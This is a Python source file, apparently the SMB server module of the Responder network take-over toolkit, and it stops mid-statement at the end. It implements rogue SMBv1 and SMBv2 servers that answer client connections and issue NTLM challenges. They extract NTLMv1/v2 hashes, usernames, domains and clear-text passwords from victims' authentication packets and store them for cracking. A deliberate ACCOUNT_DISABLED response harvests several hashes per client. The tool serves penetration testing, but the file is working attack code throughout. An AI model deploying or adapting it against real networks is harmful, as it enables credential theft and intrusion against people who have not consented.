#!/usr/bin/env python
# This file is part of Responder, a network take-over set of tools 
# created and maintained by Laurent Gaffie.
# email: laurent.gaffie@gmail.com
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.
import struct, re
import codecs
from utils import *
if settings.Config.PY2OR3 == "PY3":
	from socketserver import BaseRequestHandler
else:
	from SocketServer import BaseRequestHandler
from random import randrange
from packets import SMBHeader, SMBNegoAnsLM, SMBNegoKerbAns, SMBSession1Data, SMBSession2Accept, SMBSessEmpty, SMBTreeData, SMB2Header, SMB2NegoAns, SMB2Session1Data, SMB2Session2Data

# Add Impacket support for SMBv2
try:
	import sys
	import os
	sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', '..', 'impacket'))
	from impacket import smbserver
	from impacket.ntlm import compute_lmhash, compute_nthash
	IMPACKET_AVAILABLE = True
except ImportError:
	IMPACKET_AVAILABLE = False

def Is_Anonymous(data):  # Detect if SMB auth was Anonymous
	SecBlobLen = struct.unpack('<H',data[51:53])[0]

	if SecBlobLen < 260:
		LMhashLen = struct.unpack('<H',data[89:91])[0]
		return LMhashLen in [0, 1]
	elif SecBlobLen > 260:
		LMhashLen = struct.unpack('<H',data[93:95])[0]
		return LMhashLen in [0, 1]

def Is_LMNT_Anonymous(data):
	LMhashLen = struct.unpack('<H',data[51:53])[0]
	return LMhashLen in [0, 1]

#Function used to know which dialect number to return for NT LM 0.12
def Parse_Nego_Dialect(data):
	Dialect = tuple([e.replace('\x00','') for e in data[40:].split('\x02')[:10]])
	for i in range(0, 16):
		if Dialect[i] == 'NT LM 0.12':
			return chr(i) + '\x00'

def midcalc(data):  #Set MID SMB Header field.
    return data[34:36]

def uidcalc(data):  #Set UID SMB Header field.
    return data[32:34]

def pidcalc(data):  #Set PID SMB Header field.
    pack=data[30:32]
    return pack

def tidcalc(data):  #Set TID SMB Header field.
    pack=data[28:30]
    return pack

def ParseShare(data):
	packet = data[:]
	a = re.search(b'(\\x5c\\x00\\x5c.*.\\x00\\x00\\x00)', packet)
	if a:
		print(text("[SMB] Requested Share     : %s" % a.group(0).decode('UTF-16LE')))

def GrabMessageID(data):
    Messageid = data[28:36]
    return Messageid

def GrabCreditRequested(data):
    CreditsRequested = data[18:20]
    if CreditsRequested == b'\x00\x00':
       CreditsRequested =  b'\x01\x00'
    else:
       CreditsRequested = data[18:20]
    return CreditsRequested

def GrabCreditCharged(data):
    CreditCharged = data[10:12]
    return CreditCharged

def GrabSessionID(data):
    SessionID = data[44:52]
    return SessionID

def ParseSMBHash(data,client, Challenge):  #Parse SMB NTLMSSP v1/v2
	SSPIStart  = data.find(b'NTLMSSP')
	SSPIString = data[SSPIStart:]
	LMhashLen    = struct.unpack('<H',data[SSPIStart+14:SSPIStart+16])[0]
	LMhashOffset = struct.unpack('<H',data[SSPIStart+16:SSPIStart+18])[0]
	LMHash       = SSPIString[LMhashOffset:LMhashOffset+LMhashLen]
	LMHash	     = codecs.encode(LMHash, 'hex').upper().decode('latin-1')
	NthashLen    = struct.unpack('<H',data[SSPIStart+20:SSPIStart+22])[0]
	NthashOffset = struct.unpack('<H',data[SSPIStart+24:SSPIStart+26])[0]

	if NthashLen == 24:
		SMBHash      = SSPIString[NthashOffset:NthashOffset+NthashLen]
		SMBHash      = codecs.encode(SMBHash, 'hex').upper().decode('latin-1')
		DomainLen    = struct.unpack('<H',SSPIString[30:32])[0]
		DomainOffset = struct.unpack('<H',SSPIString[32:34])[0]
		Domain       = SSPIString[DomainOffset:DomainOffset+DomainLen].decode('UTF-16LE')
		UserLen      = struct.unpack('<H',SSPIString[38:40])[0]
		UserOffset   = struct.unpack('<H',SSPIString[40:42])[0]
		Username     = SSPIString[UserOffset:UserOffset+UserLen].decode('UTF-16LE')
		WriteHash    = '%s::%s:%s:%s:%s' % (Username, Domain, LMHash, SMBHash, codecs.encode(Challenge,'hex').decode('latin-1'))

		SaveToDb({
			'module': 'SMB', 
			'type': 'NTLMv1-SSP', 
			'client': client, 
			'user': Domain+'\\'+Username, 
			'hash': SMBHash, 
			'fullhash': WriteHash,
		})

	if NthashLen > 60:
		SMBHash      = SSPIString[NthashOffset:NthashOffset+NthashLen]
		SMBHash      = codecs.encode(SMBHash, 'hex').upper().decode('latin-1')
		DomainLen    = struct.unpack('<H',SSPIString[30:32])[0]
		DomainOffset = struct.unpack('<H',SSPIString[32:34])[0]
		Domain       = SSPIString[DomainOffset:DomainOffset+DomainLen].decode('UTF-16LE')
		UserLen      = struct.unpack('<H',SSPIString[38:40])[0]
		UserOffset   = struct.unpack('<H',SSPIString[40:42])[0]
		Username     = SSPIString[UserOffset:UserOffset+UserLen].decode('UTF-16LE')
		WriteHash    = '%s::%s:%s:%s:%s' % (Username, Domain, codecs.encode(Challenge,'hex').decode('latin-1'), SMBHash[:32], SMBHash[32:])

		SaveToDb({
			'module': 'SMB', 
			'type': 'NTLMv2-SSP', 
			'client': client, 
			'user': Domain+'\\'+Username, 
			'hash': SMBHash, 
			'fullhash': WriteHash,
		})

def ParseLMNTHash(data, client, Challenge):  # Parse SMB NTLMv1/v2
	LMhashLen = struct.unpack('<H',data[51:53])[0]
	NthashLen = struct.unpack('<H',data[53:55])[0]
	Bcc = struct.unpack('<H',data[63:65])[0]
	Username, Domain = tuple([e.decode('latin-1') for e in data[89+NthashLen:Bcc+60].split(b'\x00\x00\x00')[:2]])

	if NthashLen > 25:
		FullHash = codecs.encode(data[65+LMhashLen:65+LMhashLen+NthashLen],'hex')
		LmHash = FullHash[:32].upper()
		NtHash = FullHash[32:].upper()
		WriteHash = '%s::%s:%s:%s:%s' % (Username, Domain, codecs.encode(Challenge,'hex').decode('latin-1'), LmHash.decode('latin-1'), NtHash.decode('latin-1'))
	
		SaveToDb({
			'module': 'SMB', 
			'type': 'NTLMv2', 
			'client': client, 
			'user': Domain+'\\'+Username, 
			'hash': NtHash, 
			'fullhash': WriteHash,
		})

	if NthashLen == 24:
		NtHash = codecs.encode(data[65+LMhashLen:65+LMhashLen+NthashLen],'hex').upper()
		LmHash = codecs.encode(data[65:65+LMhashLen],'hex').upper()
		WriteHash = '%s::%s:%s:%s:%s' % (Username, Domain, LmHash.decode('latin-1'), NtHash.decode('latin-1'), codecs.encode(Challenge,'hex').decode('latin-1'))
		SaveToDb({
			'module': 'SMB', 
			'type': 'NTLMv1', 
			'client': client, 
			'user': Domain+'\\'+Username, 
			'hash': NtHash, 
			'fullhash': WriteHash,
		})

def IsNT4ClearTxt(data, client):
	HeadLen = 36

	if data[14:16] == "\x03\x80":
		SmbData = data[HeadLen+14:]
		WordCount = data[HeadLen]
		ChainedCmdOffset = data[HeadLen+1]

		if ChainedCmdOffset == "\x75" or ChainedCmdOffset == 117:
			PassLen = struct.unpack('<H',data[HeadLen+15:HeadLen+17])[0]

			if PassLen > 2:
				Password = data[HeadLen+30:HeadLen+30+PassLen].replace("\x00","")
				User = ''.join(tuple(data[HeadLen+30+PassLen:].split('\x00\x00\x00'))[:1]).replace("\x00","")
				print(text("[SMB] Clear Text Credentials: %s:%s" % (User,Password)))
				WriteData(settings.Config.SMBClearLog % client, User+":"+Password, User+":"+Password)


class SMB1(BaseRequestHandler):  # SMB1 & SMB2 Server class, NTLMSSP
	def handle(self):
		try:
			self.ntry = 0
			while True:
				data = self.request.recv(1024)
				self.request.settimeout(10)  # Increase timeout to 10 seconds
				Challenge = RandomChallenge()

				if not data:
					if settings.Config.Verbose:
						print(color("[+] SMB2: Connection closed by client %s" % self.client_address[0], 3))
					break

				if data[0:1] == b"\x81":  #session request 139
					Buffer = "\x82\x00\x00\x00"
					try:
						self.request.send(Buffer)
						data = self.request.recv(1024)
					except:
						pass

				if data[8:10] == b"\x72\x00" and re.search(rb"SMB 2.\?\?\?", data):
					head = SMB2Header(CreditCharge="\x00\x00",Credits="\x01\x00")
					t = SMB2NegoAns()
					t.calculate()
					packet1 = str(head)+str(t)
					buffer1 = StructPython2or3('>i', str(packet1))+str(packet1)
					self.request.send(NetworkSendBufferPython2or3(buffer1))
					data = self.request.recv(1024)

				if data[16:18] == b"\x00\x00" and data[4:5] == b"\xfe":
					head = SMB2Header(MessageId=GrabMessageID(data).decode('latin-1'), PID="\xff\xfe\x00\x00", CreditCharge=GrabCreditCharged(data).decode('latin-1'), Credits=GrabCreditRequested(data).decode('latin-1'))
					t = SMB2NegoAns(Dialect="\x10\x02")
					t.calculate()
					packet1 = str(head)+str(t)
					buffer1 = StructPython2or3('>i', str(packet1))+str(packet1)
					self.request.send(NetworkSendBufferPython2or3(buffer1))
					data = self.request.recv(1024)

				if data[16:18] == b"\x01\x00" and data[4:5] == b"\xfe":
					head = SMB2Header(Cmd="\x01\x00", MessageId=GrabMessageID(data).decode('latin-1'), PID="\xff\xfe\x00\x00", CreditCharge=GrabCreditCharged(data).decode('latin-1'), Credits=GrabCreditRequested(data).decode('latin-1'), SessionID=GrabSessionID(data).decode('latin-1'),NTStatus="\x16\x00\x00\xc0")
					t = SMB2Session1Data(NTLMSSPNtServerChallenge=NetworkRecvBufferPython2or3(Challenge))
					t.calculate()
					packet1 = str(head)+str(t)
					buffer1 = StructPython2or3('>i', str(packet1))+str(packet1)
					self.request.send(NetworkSendBufferPython2or3(buffer1))
					data = self.request.recv(1024)

				if data[16:18] == b'\x01\x00' and GrabMessageID(data)[0:1] == b'\x02' or GrabMessageID(data)[0:1] == b'\x03' and data[4:5] == b'\xfe':
					ParseSMBHash(data, self.client_address[0], Challenge)
					if settings.Config.ErrorCode:
						ntstatus="\x6d\x00\x00\xc0"
					else:
						ntstatus="\x22\x00\x00\xc0"
					head = SMB2Header(Cmd="\x01\x00", MessageId=GrabMessageID(data).decode('latin-1'), PID="\xff\xfe\x00\x00", CreditCharge=GrabCreditCharged(data).decode('latin-1'), Credits=GrabCreditRequested(data).decode('latin-1'), NTStatus=ntstatus, SessionID=GrabSessionID(data).decode('latin-1'))
					t = SMB2Session2Data()
					packet1 = str(head)+str(t)
					buffer1 = StructPython2or3('>i', str(packet1))+str(packet1)
					self.request.send(NetworkSendBufferPython2or3(buffer1))
					data = self.request.recv(1024)

				if data[8:10] == b'\x72\x00' and data[4:5] == b'\xff' and re.search(rb'SMB 2.\?\?\?', data) == None:
					Header = SMBHeader(cmd="\x72",flag1="\x88", flag2="\x01\xc8", pid=pidcalc(NetworkRecvBufferPython2or3(data)),mid=midcalc(NetworkRecvBufferPython2or3(data)))
					Body = SMBNegoKerbAns(Dialect=Parse_Nego_Dialect(NetworkRecvBufferPython2or3(data)))
					Body.calculate()
		
					packet1 = str(Header)+str(Body)
					Buffer = StructPython2or3('>i', str(packet1))+str(packet1)

					self.request.send(NetworkSendBufferPython2or3(Buffer))
					data = self.request.recv(1024)

				if data[8:10] == b"\x73\x00" and data[4:5] == b"\xff":  # Session Setup AndX Request smbv1
					IsNT4ClearTxt(data, self.client_address[0])
					
					# STATUS_MORE_PROCESSING_REQUIRED
					Header = SMBHeader(cmd="\x73",flag1="\x88", flag2="\x01\xc8", errorcode="\x16\x00\x00\xc0", uid=chr(randrange(256))+chr(randrange(256)),pid=pidcalc(NetworkRecvBufferPython2or3(data)),tid="\x00\x00",mid=midcalc(NetworkRecvBufferPython2or3(data)))
					if settings.Config.CaptureMultipleCredentials and self.ntry == 0:
						Body = SMBSession1Data(NTLMSSPNtServerChallenge=NetworkRecvBufferPython2or3(Challenge))
					else:
						Body = SMBSession1Data(NTLMSSPNtServerChallenge=NetworkRecvBufferPython2or3(Challenge))
					Body.calculate()
		
					packet1 = str(Header)+str(Body)
					Buffer = StructPython2or3('>i', str(packet1))+str(packet1)

					self.request.send(NetworkSendBufferPython2or3(Buffer))
					data = self.request.recv(1024)

					if data[8:10] == b"\x73\x00" and data[4:5] == b"\xff":  # STATUS_SUCCESS
						if Is_Anonymous(data):
							Header = SMBHeader(cmd="\x73",flag1="\x98", flag2="\x01\xc8",errorcode="\x72\x00\x00\xc0",pid=pidcalc(NetworkRecvBufferPython2or3(data)),tid="\x00\x00",uid=uidcalc(NetworkRecvBufferPython2or3(data)),mid=midcalc(NetworkRecvBufferPython2or3(data)))
							Body = SMBSessEmpty()

							packet1 = str(Header)+str(Body)
							Buffer = StructPython2or3('>i', str(packet1))+str(packet1)

							self.request.send(NetworkSendBufferPython2or3(Buffer))

						else:
							# Parse NTLMSSP_AUTH packet
							ParseSMBHash(data,self.client_address[0], Challenge)

							if settings.Config.CaptureMultipleCredentials and self.ntry == 0:
								# Send ACCOUNT_DISABLED to get multiple hashes if there are any
								Header = SMBHeader(cmd="\x73",flag1="\x98", flag2="\x01\xc8",errorcode="\x72\x00\x00\xc0",pid=pidcalc(NetworkRecvBufferPython2or3(data)),tid="\x00\x00",uid=uidcalc(NetworkRecvBufferPython2or3(data)),mid=midcalc(NetworkRecvBufferPython2or3(data)))
								Body = SMBSessEmpty()

								packet1 = str(Header)+str(Body)
								Buffer = StructPython2or3('>i', str(packet1))+str(packet1)

								self.request.send(NetworkSendBufferPython2or3(Buffer))
								self.ntry += 1
								continue

							# Send STATUS_SUCCESS
							Header = SMBHeader(cmd="\x73",flag1="\x98", flag2="\x01\xc8", errorcode="\x00\x00\x00\x00",pid=pidcalc(NetworkRecvBufferPython2or3(data)),tid=tidcalc(NetworkRecvBufferPython2or3(data)),uid=uidcalc(NetworkRecvBufferPython2or3(data)),mid=midcalc(NetworkRecvBufferPython2or3(data)))
							Body = SMBSession2Accept()
							Body.calculate()

							packet1 = str(Header)+str(Body)
							Buffer = StructPython2or3('>i', str(packet1))+str(packet1)

							self.request.send(NetworkSendBufferPython2or3(Buffer))
							data = self.request.recv(1024)
				

				if data[8:10] == b"\x75\x00" and data[4:5] == b"\xff":  # Tree Connect AndX Request
					ParseShare(data)
					Header = SMBHeader(cmd="\x75",flag1="\x88", flag2="\x01\xc8", errorcode="\x00\x00\x00\x00", pid=pidcalc(NetworkRecvBufferPython2or3(data)), tid=chr(randrange(256))+chr(randrange(256)), uid=uidcalc(data), mid=midcalc(NetworkRecvBufferPython2or3(data)))
					Body = SMBTreeData()
					Body.calculate()

					packet1 = str(Header)+str(Body)
					Buffer = StructPython2or3('>i', str(packet1))+str(packet1)

					self.request.send(NetworkSendBufferPython2or3(Buffer))
					data = self.request.recv(1024)
		except:
			pass


class SMB1LM(BaseRequestHandler):  # SMB Server class, old version
	def handle(self):
		try:
			self.request.settimeout(1)
			data = self.request.recv(1024)
			Challenge = RandomChallenge()
			if data[0:1] == b"\x81":  #session request 139
				Buffer = "\x82\x00\x00\x00"
				self.request.send(NetworkSendBufferPython2or3(Buffer))
				data = self.request.recv(1024)

			if data[8:10] == b"\x72\x00":  #Negotiate proto answer.
				head = SMBHeader(cmd="\x72",flag1="\x80", flag2="\x00\x00",pid=pidcalc(NetworkRecvBufferPython2or3(data)),mid=midcalc(NetworkRecvBufferPython2or3(data)))
				Body = SMBNegoAnsLM(Dialect=Parse_Nego_Dialect(NetworkRecvBufferPython2or3(data)),Domain="",Key=NetworkRecvBufferPython2or3(Challenge))
				Body.calculate()
				Packet = str(head)+str(Body)
				Buffer = StructPython2or3('>i', str(Packet))+str(Packet)
				self.request.send(NetworkSendBufferPython2or3(Buffer))
				data = self.request.recv(1024)

			if data[8:10] == b"\x73\x00":  #Session Setup AndX Request
				if Is_LMNT_Anonymous(data):
					head = SMBHeader(cmd="\x73",flag1="\x90", flag2="\x53\xc8",errorcode="\x72\x00\x00\xc0",pid=pidcalc(NetworkRecvBufferPython2or3(data)),tid=tidcalc(NetworkRecvBufferPython2or3(data)),uid=uidcalc(NetworkRecvBufferPython2or3(data)),mid=midcalc(NetworkRecvBufferPython2or3(data)))
					Packet = str(head)+str(SMBSessEmpty())
					Buffer = StructPython2or3('>i', str(Packet))+str(Packet)
					self.request.send(NetworkSendBufferPython2or3(Buffer))
				else:
					ParseLMNTHash(data,self.client_address[0], Challenge)
					if settings.Config.ErrorCode:
						ntstatus="\x6d\x00\x00\xc0"
					else:
						ntstatus="\x22\x00\x00\xc0"
					head = SMBHeader(cmd="\x73",flag1="\x90", flag2="\x53\xc8",errorcode=ntstatus,pid=pidcalc(NetworkRecvBufferPython2or3(data)),tid=tidcalc(NetworkRecvBufferPython2or3(data)),uid=uidcalc(NetworkRecvBufferPython2or3(data)),mid=midcalc(NetworkRecvBufferPython2or3(data)))
					Packet = str(head) + str(SMBSessEmpty())
					Buffer = StructPython2or3('>i', str(Packet))+str(Packet)
					self.request.send(NetworkSendBufferPython2or3(Buffer))
					data = self.request.recv(1024)
		except Exception:
			self.request.close()
			pass

class SMB2(SMB1):  # SMB2 Server class extending SMB1 with enhanced SMBv2 support
	def __init__(self, request, client_address, server):
		if not IMPACKET_AVAILABLE:
			print(color("[!] Impacket not found. Please install Impacket to use SMBv2 support."))
			print(color("[!] You can install it with: pip install impacket"))
			sys.exit(1)
		
		# Set attributes before calling parent constructor
		self.connection_state = "INIT"
		self.client_ip = client_address[0] if client_address else "unknown"
		
		super(SMB2, self).__init__(request, client_address, server)

	def handle(self):
		try:
			if settings.Config.Verbose:
				print(color("[+] SMB2: New connection from %s" % self.client_ip, 2))
			
			self.ntry = 0
			while True:
				data = self.request.recv(1024)
				self.request.settimeout(10)  # Increase timeout to 10 seconds
				Challenge = RandomChallenge()

				if not data:
					if settings.Config.Verbose:
						print(color("[+] SMB2: Connection closed by client %s" % self.client_ip, 3))
					break

				if settings.Config.Verbose:
					print(color("[+] SMB2: Received %d bytes from %s" % (len(data), self.client_ip), 3))
					# Add packet analysis for debugging
					if len(data) >= 4:
						smb_version = data[4:5]
						if smb_version == b'\xfe':
							print(color("[+] SMB2: SMBv2 packet detected (version 0xfe)", 3))
						elif smb_version == b'\xff':
							print(color("[+] SMB2: SMBv1 packet detected (version 0xff)", 3))
						else:
							print(color("[+] SMB2: Unknown SMB version: 0x%02x" % ord(smb_version), 3))
					
					if len(data) >= 10:
						command = data[8:10]
						print(color("[+] SMB2: Command: 0x%02x%02x" % (command[0], command[1]), 3))

				if data[0:1] == b"\x81":  #session request 139
					if settings.Config.Verbose:
						print(color("[+] SMB2: Session request (port 139)", 3))
					Buffer = "\x82\x00\x00\x00"
					try:
						self.request.send(Buffer)
						data = self.request.recv(1024)
					except Exception as e:
						if settings.Config.Verbose:
							print(color("[!] SMB2: Error sending session response: %s" % str(e), 1))
						break

				# Handle SMBv2 packets first (following original SMB1 pattern)
				if data[8:10] == b"\x72\x00" and re.search(rb"SMB 2.\?\?\?", data) and data[4:5] == b"\xfe":
					if settings.Config.Verbose:
						print(color("[+] SMB2: Handling SMBv2 negotiate request", 2))
					self.connection_state = "SMBV2_NEGOTIATE"
					head = SMB2Header(CreditCharge="\x00\x00",Credits="\x01\x00")
					t = SMB2NegoAns()
					t.calculate()
					packet1 = str(head)+str(t)
					buffer1 = StructPython2or3('>i', str(packet1))+str(packet1)
					try:
						self.request.send(NetworkSendBufferPython2or3(buffer1))
						data = self.request.recv(1024)
						if settings.Config.Verbose:
							print(color("[+] SMB2: Sent negotiate response, waiting for session setup", 3))
					except Exception as e:
						if settings.Config.Verbose:
							print(color("[!] SMB2: Error in SMBv2 negotiate: %s" % str(e), 1))
						break

				elif data[16:18] == b"\x00\x00" and data[4:5] == b"\xfe":
					if settings.Config.Verbose:
						print(color("[+] SMB2: Handling SMBv2 negotiate response", 2))
					self.connection_state = "SMBV2_NEGOTIATE_RESPONSE"
					head = SMB2Header(MessageId=GrabMessageID(data).decode('latin-1'), PID="\xff\xfe\x00\x00", CreditCharge=GrabCreditCharged(data).decode('latin-1'), Credits=GrabCreditRequested(data).decode('latin-1'))
					# Use the same dialect as original SMB1 class
					t = SMB2NegoAns(Dialect="\x10\x02")  # SMB 2.0.2
					t.calculate()
					packet1 = str(head)+str(t)
					buffer1 = StructPython2or3('>i', str(packet1))+str(packet1)
					try:
						self.request.send(NetworkSendBufferPython2or3(buffer1))
						data = self.request.recv(1024)
						if settings.Config.Verbose:
							print(color("[+] SMB2: Sent negotiate response, waiting for session setup", 3))
					except Exception as e:
						if settings.Config.Verbose:
							print(color("[!] SMB2: Error in SMBv2 negotiate response: %s" % str(e), 1))
						break

				elif data[16:18] == b"\x01\x00" and data[4:5] == b"\xfe":
					if settings.Config.Verbose:
						print(color("[+] SMB2: Handling SMBv2 session setup", 2))
					self.connection_state = "SMBV2_SESSION_SETUP"
					head = SMB2Header(Cmd="\x01\x00", MessageId=GrabMessageID(data).decode('latin-1'), PID="\xff\xfe\x00\x00", CreditCharge=GrabCreditCharged(data).decode('latin-1'), Credits=GrabCreditRequested(data).decode('latin-1'), SessionID=GrabSessionID(data).decode('latin-1'),NTStatus="\x16\x00\x00\xc0")
					t = SMB2Session1Data(NTLMSSPNtServerChallenge=NetworkRecvBufferPython2or3(Challenge))
					t.calculate()
					packet1 = str(head)+str(t)
					buffer1 = StructPython2or3('>i', str(packet1))+str(packet1)
					try:
						self.request.send(NetworkSendBufferPython2or3(buffer1))
						data = self.request.recv(1024)
						if settings.Config.Verbose:
							print(color("[+] SMB2: Sent session setup challenge, waiting for auth", 3))
					except Exception as e:
						if settings.Config.Verbose:
							print(color("[!] SMB2: Error in SMBv2 session setup: %s" % str(e), 1))
						break

				elif data[16:18] == b'\x01\x00' and GrabMessageID(data)[0:1] == b'\x02' or GrabMessageID(data)[0:1] == b'\x03' and data[4:5] == b'\xfe':
					if settings.Config.Verbose:
						print(color("[+] SMB2: Handling SMBv2 session setup response", 2))
					self.connection_state = "SMBV2_SESSION_SETUP_RESPONSE"
					ParseSMBHash(data, self.client_address[0], Challenge)
					if settings.Config.ErrorCode:
						ntstatus="\x6d\x00\x00\xc0"
					else:
						ntstatus="\x22\x00\x00\xc0"
					head = SMB2Header(Cmd="\x01\x00", MessageId=GrabMessageID(data).decode('latin-1'), PID="\xff\xfe\x00\x00", CreditCharge=GrabCreditCharged(data).decode('latin-1'), Credits=GrabCreditRequested(data).decode('latin-1'), NTStatus=ntstatus, SessionID=GrabSessionID(data).decode('latin-1'))
					t = SMB2Session2Data()
					packet1 = str(head)+str(t)
					buffer1 = StructPython2or3('>i', str(packet1))+str(packet1)
					try:
						self.request.send(NetworkSendBufferPython2or3(buffer1))
						data = self.request.recv(1024)
						if settings.Config.Verbose:
							print(color("[+] SMB2: Sent session setup response", 3))
					except Exception as e:
						if settings.Config.Verbose:
							print(color("[!] SMB2: Error in SMBv2 session setup response: %s" % str(e), 1))
						break

				# Fall back to SMBv1 handling for compatibility (following original SMB1 pattern)
				elif data[8:10] == b'\x72\x00' and data[4:5] == b'\xff' and re.search(rb'SMB 2.\?\?\?', data) == None:
					if settings.Config.Verbose:
						print(color("[+] SMB2: Falling back to SMBv1 negotiate", 3))
					self.connection_state = "SMBV1_NEGOTIATE"
					Header = SMBHeader(cmd="\x72",flag1="\x88", flag2="\x01\xc8", pid=pidcalc(NetworkRecvBufferPython2or3(data)),mid=midcalc(NetworkRecvBufferPython2or3(data)))
					Body = SMBNegoKerbAns(Dialect=Parse_Nego_Dialect(NetworkRecvBufferPython2or3(data)))
					Body.calculate()
			
					packet1 = str(Header)+str(Body)
					Buffer = StructPython2or3('>i', str(packet1))+str(packet1)

					try:
						self.request.send(NetworkSendBufferPython2or3(Buffer))
						data = self.request.recv(1024)
						if settings.Config.Verbose:
							print(color("[+] SMB2: Sent SMBv1 negotiate response, received %d bytes" % len(data), 3))
					except Exception as e:
						if settings.Config.Verbose:
							print(color("[!] SMB2: Error sending SMBv1 negotiate response: %s" % str(e), 1))
						break

				elif data[8:10] == b"\x73\x00" and data[4:5] == b"\xff":  # Session Setup AndX Request smbv1
					if settings.Config.Verbose:
						print(color("[+] SMB2: Handling SMBv1 session setup", 3))
					self.connection_state = "SMBV1_SESSION_SETUP"
					IsNT4ClearTxt(data, self.client_address[0])
					
					# STATUS_MORE_PROCESSING_REQUIRED
					Header = SMBHeader(cmd="\x73",flag1="\x88", flag2="\x01\xc8", errorcode="\x16\x00\x00\xc0", uid=chr(randrange(256))+chr(randrange(256)),pid=pidcalc(NetworkRecvBufferPython2or3(data)),tid="\x00\x00",mid=midcalc(NetworkRecvBufferPython2or3(data)))
					if settings.Config.CaptureMultipleCredentials and self.ntry == 0:
						Body = SMBSession1Data(NTLMSSPNtServerChallenge=NetworkRecvBufferPython2or3(Challenge))
					else:
						Body = SMBSession1Data(NTLMSSPNtServerChallenge=NetworkRecvBufferPython2or3(Challenge))
					Body.calculate()
			
					packet1 = str(Header)+str(Body)
					Buffer = StructPython2or3('>i', str(packet1))+str(packet1)

					try:
						self.request.send(NetworkSendBufferPython2or3(Buffer))
						data = self.request.recv(1024)
						if settings.Config.Verbose:
							print(color("[+] SMB2: Sent SMBv1 session setup challenge, received %d bytes" % len(data), 3))
					except Exception as e:
						if settings.Config.Verbose:
							print(color("[!] SMB2: Error sending SMBv1 session setup response: %s" % str(e), 1))
						break

					if data[8:10] == b"\x73\x00" and data[4:5] == b"\xff":  # STATUS_SUCCESS
						if Is_Anonymous(data):
							if settings.Config.Verbose:
								print(color("[+] SMB2: Anonymous login detected", 3))
							Header = SMBHeader(cmd="\x73",flag1="\x98", flag2="\x01\xc8",errorcode="\x72\x00\x00\xc0",pid=pidcalc(NetworkRecvBufferPython2or3(data)),tid="\x00\x00",uid=uidcalc(NetworkRecvBufferPython2or3(data)),mid=midcalc(NetworkRecvBufferPython2or3(data)))
							Body = SMBSessEmpty()

							packet1 = str(Header)+str(Body)
							Buffer = StructPython2or3('>i', str(packet1))+str(packet1)

							try:
								self.request.send(NetworkSendBufferPython2or3(Buffer))
								if settings.Config.Verbose:
									print(color("[+] SMB2: Sent anonymous response", 3))
							except Exception as e:
								if settings.Config.Verbose:
									print(color("[!] SMB2: Error sending anonymous response: %s" % str(e), 1))
								break

						else:
							# Parse NTLMSSP_AUTH packet
							if settings.Config.Verbose:
								print(color("[+] SMB2: Parsing NTLM hash", 3))
							ParseSMBHash(data,self.client_address[0], Challenge)

							if settings.Config.CaptureMultipleCredentials and self.ntry == 0:
								# Send ACCOUNT_DISABLED to get multiple hashes if there are any
								if settings.Config.Verbose:
									print(color("[+] SMB2: Sending ACCOUNT_DISABLED for multiple hash capture", 3))
								Header = SMBHeader(cmd="\x73",flag1="\x98", flag2="\x01\xc8",errorcode="\x72\x00\x00\xc0",pid=pidcalc(NetworkRecvBufferPython2or3(data)),tid="\x00\x00",uid=uidcalc(NetworkRecvBufferPython2or3(data)),mid=midcalc(NetworkRecvBufferPython2or3(data)))
								Body = SMBSessEmpty()

								packet1 = str(Header)+str(Body)
								Buffer = StructPython2or3('>i', str(packet1))+str(packet1)

								try:
									self.request.send(NetworkSendBufferPython2or3(Buffer))
									self.ntry += 1
									if settings.Config.Verbose:
										print(color("[+] SMB2: Sent ACCOUNT_DISABLED, continuing for more hashes", 3))
									continue
								except Exception as e:
									if settings.Config.Verbose:
										print(color("[!] SMB2: Error sending ACCOUNT_DISABLED: %s" % str(e), 1))
									break

							# Send STATUS_SUCCESS
							if settings.Config.Verbose:
								print(color("[+] SMB2: Sending STATUS_SUCCESS", 3))
							Header = SMBHeader(cmd="\x73",flag1="\x98", flag2="\x01\xc8", errorcode="\x00\x00\x00\x00",pid=pidcalc(NetworkRecvBufferPython2or3(data)),tid=tidcalc(NetworkRecvBufferPython2or3(data)),uid=uidcalc(NetworkRecvBufferPython2or3(data)),mid=midcalc(NetworkRecvBufferPython2or3(data)))
							Body = SMBSession2Accept()
							Body.calculate()

							packet1 = str(Header)+str(Body)
							Buffer = StructPython2or3('>i', str(packet1))+str(packet1)

							try:
								self.request.send(NetworkSendBufferPython2or3(Buffer))
								data = self.request.recv(1024)
								if settings.Config.Verbose:
									print(color("[+] SMB2: Sent STATUS_SUCCESS, received %d bytes" % len(data), 3))
							except Exception as e:
								if settings.Config.Verbose:
									print(color("[!] SMB2: Error sending STATUS_SUCCESS: %s" % str(e), 1))
								break

				elif data[8:10] == b"\x75\x00" and data[4:5] == b"\xff":  # Tree Connect AndX Request
					if settings.Config.Verbose:
						print(color("[+] SMB2: Handling tree connect request", 3))
					self.connection_state = "SMBV1_TREE_CONNECT"
					ParseShare(data)
					Header = SMBHeader(cmd="\x75",flag1="\x88", flag2="\x01\xc8", errorcode="\x00\x00\x00\x00", pid=pidcalc(NetworkRecvBufferPython2or3(data)), tid=chr(randrange(256))+chr(randrange(256)), uid=uidcalc(data), mid=midcalc(NetworkRecvBufferPython2or3(data)))
					Body = SMBTreeData()
					Body.calculate()

					packet1 = str(Header)+str(Body)
					Buffer = StructPython2or3('>i', str(packet1))+str(packet1)

					try:
						self.request.send(NetworkSendBufferPython2or3(Buffer))
						data = self.request.recv(1024)
						if settings.Config.Verbose:
							print(color("[+] SMB2: Sent tree connect response, received %d bytes" % len(data), 3))
					except Exception as e:
						if settings.Config.Verbose:
							print(color("[!] SMB2: Error sending tree connect response: %s" % str(e), 1))
						break

				else:
					# Unknown packet type
					if settings.Config.Verbose:
						print(color("[+] SMB2: Unknown packet type, command: 0x%02x%02x, version: 0x%02x" % (data[8], data[9], data[4]), 3))
					break

		except Exception as e:
			if settings.Config.Verbose:
				print(color("[!] SMB2 Error: %s" % str(e), 1))
				print(color("[!] SMB2 Connection state: %s" % getattr(self, 'connection_state', 'UNKNOWN'), 1))
				import traceback
				traceback.print_exc()
			else:
				print(color("[!] SMB2 Error: %s" % str(e), 1))
		finally:
			if settings.Config.Verbose:
